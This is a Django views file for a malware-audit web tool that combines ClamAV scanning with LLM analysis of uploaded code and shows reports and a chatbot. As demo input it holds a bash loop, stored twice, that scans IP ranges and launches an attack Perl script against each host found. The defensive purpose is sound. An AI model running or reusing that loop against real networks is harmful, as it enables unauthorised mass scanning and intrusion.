import asyncio
import datetime as dt
import os
import subprocess
import threading
import time
from sys import platform
import tiktoken
from django.core.files.base import ContentFile
from django.http import JsonResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
import gradio as gr
from exceptiongroup import catch
import html
import subprocess

import manage
from AutoAudit import models

sample_dict_engine1 = {'Knowm viruses': '8670385', 'Engine version': '0.103.8', 'Is_infected': 'No',
                       'Time': '14.067 sec (0m14s)', 'Virus type': 'OK'}

sample_dict_engine2 = {
    'Input': "while true \ndo\ni=`/usr/local/bin/perl /dev/cuc/ranip.pl`\nj=0\nwhile [ $j -lt 256 ];do\n/dev/cuc/grabbb -t 3 -a $i.$j.1 -b $i.$j.50 80 >> /dev/cub/$i.txt\n/dev/cuc/grabbb -t 3 -a $i.$j.51 -b $i.$j.100 80 >> /dev/cub/$i.txt\n/dev/cuc/grabbb -t 3 -a $i.$j.101 -b $i.$j.150 80 >> /dev/cub/$i.txt\n/dev/cuc/grabbb -t 3 -a $i.$j.151 -b $i.$j.200 80 >> /dev/cub/$i.txt\n/dev/cuc/grabbb -t 3 -a $i.$j.201 -b $i.$j.254 80 >> /dev/cub/$i.txt\nj=`/bin/echo \"$j+1\"|/bin/bc`\ndone\niplist=`/bin/awk -F: '{print $1}' /dev/cub/$i.txt`\nfor ip in $iplist;do\n/usr/local/bin/perl /dev/cuc/uniattack.pl $ip:80 >> /dev/cub/result.txt\ndone\nrm -f /dev/cub/$i.txt",
    'Analysis': '''The given bash statement appears to be a script that runs a continuous loop with nested loops and executes various commands involving network interactions and file operations. It retrieves IP addresses, performs scanning operations, and launches attacks using a Perl script.''',
    'Label': 'high',
    'Risk': 'The usage of external Perl scripts and network commands within the script, along with the nature of IP scanning and potential attack execution, indicates a high security risk.',
    'Solution': 'Ensure that the script is used responsibly and for legitimate purposes only, as unauthorized network scanning and launching attacks are illegal and unethical.',
    'Time': "14.067 sec (0m14s)"
}

engine_num = 2
max_segment_length = 300
instruction = "Analyze this statement and determine whether it contains security risk"
sample_code = "while true \ndo\ni=`/usr/local/bin/perl /dev/cuc/ranip.pl`\nj=0\nwhile [ $j -lt 256 ];do\n/dev/cuc/grabbb -t 3 -a $i.$j.1 -b $i.$j.50 80 >> /dev/cub/$i.txt\n/dev/cuc/grabbb -t 3 -a $i.$j.51 -b $i.$j.100 80 >> /dev/cub/$i.txt\n/dev/cuc/grabbb -t 3 -a $i.$j.101 -b $i.$j.150 80 >> /dev/cub/$i.txt\n/dev/cuc/grabbb -t 3 -a $i.$j.151 -b $i.$j.200 80 >> /dev/cub/$i.txt\n/dev/cuc/grabbb -t 3 -a $i.$j.201 -b $i.$j.254 80 >> /dev/cub/$i.txt\nj=`/bin/echo \"$j+1\"|/bin/bc`\ndone\niplist=`/bin/awk -F: '{print $1}' /dev/cub/$i.txt`\nfor ip in $iplist;do\n/usr/local/bin/perl /dev/cuc/uniattack.pl $ip:80 >> /dev/cub/result.txt\ndone\nrm -f /dev/cub/$i.txt"

'''
def is_binary_file(file_path):
    try:
        with magic.Magic(mime=True) as m:
            file_type = m.id_filename(file_path)
            return file_type.startswith('application/') or file_type == 'text/plain'
    except magic.MagicException:
        return False
'''
from django.apps import apps

Autoauditconfig = apps.get_app_config('AutoAudit')

Demo = None
count = 7860

def kill_gradio():
    # 使用 lsof 命令查找占据指定端口的进程
    lsof_command = f'lsof -t -i:7860'
    output = subprocess.run(lsof_command, shell=True, capture_output=True, text=True, check=True).stdout.strip()

    if output:
        # 使用 kill 命令杀死进程
        kill_command = f'kill {output}'
        subprocess.run(kill_command, shell=True, check=True)
        print(f"Process with ID {output} has been killed.")
    else:
        print("No process found using the specified port.")


def split_text_into_segments(text, encoding_name):
    encoding = tiktoken.get_encoding(encoding_name)
    tokens = encoding.encode(text)

    # 切分成段落，每段不超过 max_segment_length 个 token
    segments = []
    segments_string = []
    current_segment = []
    token_count = 0
    segment_count = 0
    for token in tokens:
        token_count += 1
        # token in ['.', '!', '?'] and token_count > max_segment_length
        if token_count > max_segment_length:
            if segment_count == 0:
                segments = [current_segment]
                segments_string = [encoding.decode(current_segment)]
            else:
                segments.append(current_segment)
                segments_string.append(encoding.decode(current_segment))
            segment_count += 1
            current_segment = [token]
            token_count = 0
        else:
            current_segment.append(token)
    if token_count <= max_segment_length:
        if segment_count == 0:
            segments = [current_segment]
            segments_string = [encoding.decode(current_segment)]
        else:
            segments_string.append(encoding.decode(current_segment))

    return segments_string


class scan_file:
    # 初始化
    def __init__(self, file_path):
        self.file_path = file_path
        self.clamav_command = None
        self.virus_type = None  # 病毒类型
        self.Known_viruses = None  # 已知病毒样本的数量
        self.Engine_version = None  # 引擎版本
        self.Infected_files = None  # 检测到的病毒文件数量
        self.Data_scanned = None  # 读取的数据量
        self.Time = None  # 扫描耗时
        self.Start_Date = None  # 扫描开始时间

    # 扫描文件
    def scan_file_with_clamav(self):
        # 判断当前的操作系统类型
        if platform.startswith('win'):
            # 构建 ClamAV 命令行命令（Windows）
            self.clamav_command = ['clamscan.exe', self.file_path]
        elif platform.startswith('linux'):
            # 构建 ClamAV 命令行命令（Linux）
            self.clamav_command = ['clamscan', self.file_path]
        else:
            return "OS Error"

        # 执行命令并捕获输出
        result = subprocess.run(self.clamav_command, capture_output=True, text=True)
        # 获取扫描结果
        output = result.stdout
        # 将output转化为一个字典
        output_dict = {}
        lines = output.split('\n')
        for idx, line in enumerate(lines):
            if line.strip() == '' or line.startswith('-'):
                continue
            if idx == 0:
                # 对于第一行数据，使用最后一个冒号进行分割
                parts = line.rsplit(':', 1)
            else:
                # 对于其他行数据，使用第一个冒号进行分割
                parts = line.split(':', 1)
            if len(parts) < 2:
                continue
            key = parts[0].strip()
            value = parts[1].strip()
            output_dict[key] = value
        output_dict["virus_type"] = output_dict.pop(next(iter(output_dict)))

        self.virus_type = output_dict['virus_type']
        self.Known_viruses = output_dict['Known viruses']
        self.Engine_version = output_dict['Engine version']
        self.Infected_files = output_dict['Infected files']
        self.Data_scanned = output_dict['Data scanned']
        self.Time = output_dict['Time']
        self.Start_Date = output_dict['Start Date']
        output_dict['Start Date'] = output_dict['Start Date'].replace(':', '-', 2)

        return output_dict

    # 判断该文件是否有病毒
    def is_virus(self):
        if self.Infected_files == '0':
            return False
        else:
            return True


def parse_string(input_str):
    # Initializing a dictionary to store the extracted values
    print(input_str)
    result_dict = {}

    # Searching for the analysis item and extracting its value
    analysis_start = input_str.find("1. analysis:")
    if analysis_start != -1:
        analysis_end = input_str.find("2. label:")
        if analysis_end != -1:
            result_dict["analysis"] = input_str[analysis_start + len("1. analysis:"):analysis_end].strip()

    # Searching for the label item and extracting its value
    label_start = input_str.find("2. label:")
    if label_start != -1:
        label_end = input_str.find("3. risk:")
        if label_end != -1:
            result_dict["label"] = input_str[label_start + len("2. label:"):label_end].strip()
        else:
            result_dict["label"] = input_str[label_start + len("2. label:"):].strip()

    # Searching for the risk item and extracting its value
    risk_start = input_str.find("3. risk:")
    if risk_start != -1:
        risk_end = input_str.find("4. solution:")
        if risk_end != -1:
            result_dict["risk"] = input_str[risk_start + len("3. risk:"):risk_end].strip()
        else:
            result_dict["risk"] = input_str[risk_start + len("3. risk:"):].strip()

    # Searching for the solution item and extracting its value
    solution_start = input_str.find("4. solution:")
    if solution_start != -1:
        result_dict["solution"] = input_str[solution_start + len("4. solution:"):].strip()

    # Printing the extracted values
    return result_dict


def index(request):
    return render(request, '../static/../templates/index.html')


def upload(request):
    # if request.method == 'GET':
    # if request.method == 'POST' and (request.FILES.get('file') or request.get('codes')):
    if request.method == 'POST' and (request.FILES.get('file') or request.POST.get('content')):

        # scanning the files...
        # return inference infos in dict:
        dict_engine1 = {}  # clamAV dict
        list_engine2 = []  # LLM dict
        new_file = None
        list_input_engine2 = []
        file = None

        # REAL STATEMENTS:
        if request.FILES.get('file'):
            file = request.FILES['file']

        else:
            codes = request.POST.get('content')
            filename = "sample.txt"
            file = ContentFile(content=codes, name=filename)

        # TESTING STATEMENTS:
        '''
        codes = sample_code
        filename = "example.txt"
        file = ContentFile(content=codes)
        file.name = filename
        '''
        detection_count = 0
        risk_level = "low"

        new_file = models.File.insert(detection_count=str(detection_count) + "/" + str(engine_num),
                                      risk_level=risk_level, content_file=file)
        print(new_file.content_file.name)
        scan_file_object = scan_file(new_file.content_file.name)
        dict_engine1 = scan_file_object.scan_file_with_clamav()

        if scan_file_object.is_virus():
            detection_count += 1
            risk_level = "high"

        if new_file.type[0:4] == "text":
            with open(new_file.content_file.name, "r", encoding="utf-8") as file:
                content = file.read()
                list_input_engine2 = split_text_into_segments(content, manage.encoding_name)
                print("split text into:", str(len(list_input_engine2)))
            detected = False
            # for section_id, input in enumerate(list_input_engine2):
            for input in list_input_engine2:
                print("process a segment...")
                # print("Input: ", input)
                start_time = time.time()
                '''
                if manage.prompter == None or manage.tokenizer == None:
                    print("None!!")
                '''
                iter_obj = Autoauditconfig.evaluate(input=input, stream_output=False,instruction=instruction)
                # instruction="Analyze this statement and determine whether it contains security risk",
                result = next(iter_obj)
                print("one segment done")
                dict = {}
                dict['time'] = time.time() - start_time
                dict['version'] = manage.version
                dict['result'] = result
                dict['start_date'] = dt.datetime.now()
                dict['tokenizer'] = manage.encoding_name
                if len(list_engine2) == 0:
                    list_engine2 = [dict]
                else:
                    list_engine2.append(dict)
                list_labellow = ['low', 'Low', ' low', ' Low']
                if parse_string(result)['label'] not in list_labellow:
                    detected = True
                    risk_level = "high"
            if detected:
                detection_count += 1
        models.File.update_by_id(Id=new_file.id, detection_count=str(detection_count) + "/" + str(engine_num),
                                 risk_level=risk_level)
        models.ClamAVAnalysis.insert(file_id=new_file, virus_type=dict_engine1['virus_type'],
                                     known_viruses=dict_engine1['Known viruses'],
                                     engine_version=dict_engine1['Engine version'],
                                     data_scanned=dict_engine1['Data scanned'], time=dict_engine1['Time'],
                                     start_date=dict_engine1['Start Date'], is_infected=dict_engine1['Infected files'])

        count = 0
        for dict in list_engine2:
            models.LLMAnalysis.insert(file_id=new_file, section_id=count, version=dict['version'],
                                      result=dict['result'], time=dict['time'], start_date=dict['start_date'],
                                      tokenizer=dict['tokenizer'])

            count += 1
        # return report(request, new_file.id)
        print(new_file.id)
        return JsonResponse({'message': 'OK', "id": new_file.id})
    if request.method == 'GET':
        return render(request, '../static/../templates/upload.html')


def history(request):
    sample = models.File.objects.all().order_by('type', '-submission_date')
    content = {'samples': sample}
    return render(request, '../static/../templates/history.html', content)


def report(request, sample_id):
    print(sample_id)
    dict_date = {'fi_name': '[文件名]',
                 'fs_date': '[文件首次提交时间]', 'ls_date': '[末次提交时间]', 'la_date': '[末次分析时间]',
                 'fi_size': '[文件大小]', 'fi_type': '[文件类型]', 'an_engine': '[分析引擎]', 'th_label': '[威胁分类]',
                 'hs_sha1': '[SHA1]', 'hs_sha256': '[SHA256]', 'hs_md5': '[MD5]'}

    dict_engine1 = {'knowm viruses': '[knowm viruses]', 'engine version': '[engine version]', 'is_infected': 'no',
                    'time': '[time]', 'virus type': '[virus type]', 'start date': '[start date]'}
    dict_engine2 = {'Input': '[input]', 'Analysis': '[analysis]', 'Label': '[label]', 'Risk': '[risk]',
                    'Solution': '[solution]', 'Time': "[time]"}
    list_engine2 = []

    file = models.File.get_by_id(Id=sample_id)
    dict_date['fi_name'] = file.name
    list_sha256files = models.File.get_by_sha256(file.sha256)
    list_fsdate = []
    for file in list_sha256files:
        if len(list_fsdate) == 0:
            list_fsdate = [file.submission_date]
        else:
            list_fsdate.append(file.submission_date)
    dict_date['fs_date'] = min(list_fsdate)
    dict_date['ls_date'] = file.submission_date
    dict_date['la_date'] = file.submission_date
    dict_date['fi_size'] = file.size
    dict_date['fi_type'] = file.type
    dict_date['an_engine'] = file.detection_count
    dict_date['th_label'] = file.risk_level
    dict_date['hs_sha1'] = file.sha1
    dict_date['hs_sha256'] = file.sha256
    dict_date['hs_md5'] = file.md5

    file_engine1 = models.ClamAVAnalysis.get_by_fileid(file_id=sample_id)
    dict_engine1['knowm viruses'] = file_engine1.known_viruses
    dict_engine1['is_infected'] = file_engine1.is_infected
    dict_engine1['engine version'] = file_engine1.engine_version
    dict_engine1['time'] = file_engine1.time
    dict_engine1['start date'] = file_engine1.start_date
    dict_engine1['virus type'] = file_engine1.virus_type

    list_files_engine2 = models.LLMAnalysis.get_by_fileid(file_id=sample_id)
    version_engine2 = ""
    if len(list_files_engine2) > 0:
        list_input_engine2 = None
        version_engine2 = list_files_engine2[0].version
        tokenizer_engine2 = list_files_engine2[0].tokenizer
        with open(file.content_file.name, "r", encoding="utf-8") as file:
            content = file.read()
            list_input_engine2 = split_text_into_segments(content, tokenizer_engine2)
            print("split text into:", str(len(list_input_engine2)))
        for file_infer in list_files_engine2:
            dict = {}
            print("Section ID: ", file_infer.section_id)
            # print("Input: ", list_input_engine2[file_infer.section_id])
            dict['Input'] = list_input_engine2[file_infer.section_id]
            dict.update(parse_string(file_infer.result))
            dict['Time'] = file_infer.time
            if len(list_engine2) == 0:
                list_engine2 = [dict]
            else:
                list_engine2.append(dict)

    '''
    # Example:
    dict_engine1 = sample_dict_engine1
    dict_engine2 = sample_dict_engine2
    list_engine2 = [dict_engine2, dict_engine2, dict_engine2]
    '''

    return render(request, '../static/../templates/report.html',
                  {'fi_name': dict_date['fi_name'], 'fs_date': dict_date['fs_date'], 'ls_date': dict_date['ls_date'],
                   'la_date': dict_date['la_date'],
                   'fi_size': dict_date['fi_size'], 'fi_type': dict_date['fi_type'],
                   'an_engine': dict_date['an_engine'], 'th_label': dict_date['th_label'],
                   'hs_sha1': dict_date['hs_sha1'], 'hs_sha256': dict_date['hs_sha256'], 'hs_md5': dict_date['hs_md5'],
                   'dict_engine1': dict_engine1, 'list_engine2': list_engine2, 'engine2_version': version_engine2,
                   'file_id': sample_id
                   }, )


def report_noID(request):
    dict_date = {'fi_name': '[文件名]',
                 'fs_date': '[文件首次提交时间]', 'ls_date': '[末次提交时间]', 'la_date': '[末次分析时间]',
                 'fi_size': '[文件大小]', 'fi_type': '[文件类型]', 'an_engine': '[分析引擎]', 'th_label': '[威胁分类]',
                 'hs_sha1': '[SHA1]', 'hs_sha256': '[SHA256]', 'hs_md5': '[MD5]'}

    dict_engine1 = {'knowm viruses': '[knowm viruses]', 'engine version': '[engine version]', 'is_infected': 'no',
                    'time': '[time]', 'virus type': '[virus type]'}
    dict_engine2 = {'Input': '[input]', 'Analysis': '[analysis]', 'Label': '[label]', 'Risk': '[risk]',
                    'Solution': '[solution]', 'Time': "[time]"}
    list_engine2 = [dict_engine2, dict_engine2, dict_engine2]
    # Example:
    dict_engine1 = sample_dict_engine1
    dict_engine2 = sample_dict_engine2
    list_engine2 = [dict_engine2, dict_engine2, dict_engine2]

    return render(request, '../static/../templates/report.html',
                  {'fi_name': dict_date['fi_name'], 'fs_date': dict_date['fs_date'], 'ls_date': dict_date['ls_date'],
                   'la_date': dict_date['la_date'],
                   'fi_size': dict_date['fi_size'], 'fi_type': dict_date['fi_type'],
                   'an_engine': dict_date['an_engine'], 'th_label': dict_date['th_label'],
                   'hs_sha1': dict_date['hs_sha1'], 'hs_sha256': dict_date['hs_sha256'], 'hs_md5': dict_date['hs_md5'],
                   'dict_engine1': dict_engine1, 'list_engine2': list_engine2, 'engine2_version': '0.0.1'}, )


def chat(Instruction, Input, history):
    history = history or []
    response = Autoauditconfig.evaluate(Instruction=Instruction,Input=Input)
    myInput = "Instrction:" + Instruction + "\n" + "Input:" + Input
    history.append((myInput, response))
    return history, history


def chatbot(request):
    # 如果是get请求，直接返回页面
    # 获取上传的文件Id信息
    # os.system('lsof -t -i:7860 | xargs kill -9')
    file_id = request.GET.get("file_id")
    print("file_id:", file_id)
    description = ""
    list_engine2 = []
    if file_id != None:
        response = models.LLMAnalysis.get_by_fileid(file_id).order_by("section_id")
        input_text = models.File.get_by_id(file_id).content_file
        with open(input_text.name, "r") as f:
            text = f.read()
        segments = split_text_into_segments(text, response[0].tokenizer)
        for line in response:
            dict = {}
            dict['Input'] = segments[line.section_id]
            dict.update(parse_string(line.result))
            if len(list_engine2)==0:
                list_engine2 = [dict]
            else:
                list_engine2.append(dict)
            # description = description + '<h1>Input:' + str(line.section_id) + '<br>' + input_escaped + '<br>' + '<h3>Analysis:<br>' + '<h5>' + analysis_escaped + "<br>" + '<h3> label:<br>' + '<h5>' + dict["label"] + '<br>' + '<h3> risk:<br>' + '<h5>' + risk_escaped + '<br>'
        css_style = ''''''
        # description = "<html>"+css_style+" <div style='height: 100px; width: 100%; overflow-x:auto; overflow-y:auto;'>" + description + "</div></html>"
        description = css_style+" <div style='height: 100px; width: 100%; overflow-x:auto; overflow-y:auto;'>" + description + "</div>"
    def chatbot_demo():
        asyncio.set_event_loop(asyncio.new_event_loop())
        theme = gr.themes.Soft(
    primary_hue=gr.themes.Color(c100="#ffe4e6", c200="#cc2973", c300="#cc2973", c400="#cc2973", c50="#fff1f2",
                                c500="#e2659b", c600="#d73c7f", c700="#cc2973", c800="#9f1239", c900="#881337",
                                c950="#771d3a"),
    secondary_hue=gr.themes.Color(c100="#e0e7ff", c200="#c7d2fe", c300="#a5b4fc", c400="#9392ed", c50="#eef2ff",
                                  c500="#6366f1", c600="#4150c8", c700="#4338ca", c800="#3730a3", c900="#312e81",
                                  c950="#2b2c5e"),
    neutral_hue=gr.themes.Color(c100="#e0e7ff", c200="#c7d2fe", c300="#a5b4fc", c400="#aabbe5", c50="#ffffff",
                                c500="#7480dd", c600="#4555d2", c700="#4555d2", c800="#4555d2", c900="#4555d2",
                                c950="#38407a"), )
        with gr.Blocks(theme=theme) as demo:
            # gr.HTML(description)
            chatbot = gr.Chatbot()
            Instruction = gr.Textbox(lines=2,label="Instruction",placeholder="Ask something about cyberspace security :)")
            Input = gr.Textbox( lines=2, label="Input", placeholder="Enter your codes here :|") # lines=2, label="Input", placeholder="none"
            '''
            Maxtoken = gr.components.Slider(
                minimum=1, maximum=2000, step=1, value=128, label="Maxtoken"
            )
            '''
            Submit = gr.components.Button(label="Submit")
            # StreamOutput = gr.components.Checkbox(label="StreamOutput"),
            def user(Instruction, Input, history):
                # asyncio.set_event_loop(asyncio.new_event_loop())
                # a = history + [[[Instruction,Input],None]]
                split_word = "     "
                a= history + [[Instruction+split_word+Input,None]]
                # print(history + [[[Instruction,Input],None]])
                return "","",a
            def bot(history):
                # asyncio.set_event_loop(asyncio.new_event_loop())
                # Instruction = history[-1][0][0]
                # Input = history[-1][0][1]
                split_word = "     "
                print(history[-1][0].split(split_word))
                Instruction = history[-1][0].split(split_word)[0]
                Input = history[-1][0].split(split_word)[1]

                reponse_iter = Autoauditconfig.evaluate(instruction=Instruction,input=Input,stream_output=False,max_new_tokens=512)
                history[-1][1] = ""
                while(True):
                    try:
                        history[-1][1] = next(reponse_iter)
                        yield history
                    except StopIteration:
                        # history[-1][1] = next(reponse_iter)
                        # yield history
                        break

            # thread1 = threading.Thread(target=user)
            # thread2 = threading.Thread(target=bot)
            # thread1.start()
            # thread2.start()

            # Instruction.submit(user, [Instruction, Input, chatbot],[Instruction, Input, chatbot],queue=False).then(bot,chatbot,chatbot)
            Submit.click(fn=user, inputs = [Instruction, Input, chatbot], outputs=[Instruction, Input, chatbot], queue=False).then(
                fn = bot, inputs=[chatbot], outputs=[chatbot])

        # with gr.Blocks() as demo:
        #     chatbot = gr.Chatbot()
        #     msg = gr.Textbox()
        #     clear = gr.Button("Clear")
        #
        #     def user(user_message, history):
        #         return "", history + [[user_message, None]]
        #         # return "", history + [[[Instruction,Input], None]]
        #
        #     def bot(history):
        #         bot_message = random.choice(["How are you?", "I love you", "I'm very hungry"])
        #         history[-1][1] = ""
        #         for character in bot_message:
        #             history[-1][1] += character
        #             time.sleep(0.05)
        #             yield history
        #
        #     msg.submit(user, [msg, chatbot], [msg, chatbot], queue=False).then(
        #         bot, chatbot, chatbot
        #     )
        #     clear.click(lambda: None, None, chatbot, queue=False)
            demo.close()
            demo.queue()
            demo.launch()
    thread = threading.Thread(target=chatbot_demo)
    thread.start()


    '''
    chatbot = gr.Chatbot()

    def run_demo():
        asyncio.set_event_loop(asyncio.new_event_loop())
        demo = gr.Interface(
            theme="gradio/soft",
            fn=chat,
            inputs=[# "text", "text",
            gr.components.Textbox(
                    lines=2,
                    label="Instruction",
                    placeholder="Tell me about alpacas.",
            ),
            gr.components.Textbox(lines=2, label="Input", placeholder="none"),
            gr.components.Slider(
                minimum=1, maximum=2000, step=1, value=128, label="Maxtoken"
            ),
            gr.components.Checkbox(label="StreamOutput"),
            gr.components.State(label="history"),
            #"state"
            ],
            outputs=[chatbot, "state"],
            allow_flagging="never",
            description=description,

        )
        demo.launch(server_port=7860)

    thread = threading.Thread(target=run_demo)
    thread.start()
    '''
    return render(request, 'chatbot.html',{'count':7860,'list_engine2':list_engine2})



def search(request):
    file_name = request.POST.get("file_name")
    print(file_name)
    if file_name != None:
        print("file_name:", file_name)
        response = models.File.get_by_name(file_name)
        if response != None:
            content = {'samples': response}
            return render(request, 'history.html', content)
        else:
            return render(request, 'history.html')
    else:
        return render(request, 'history.html')
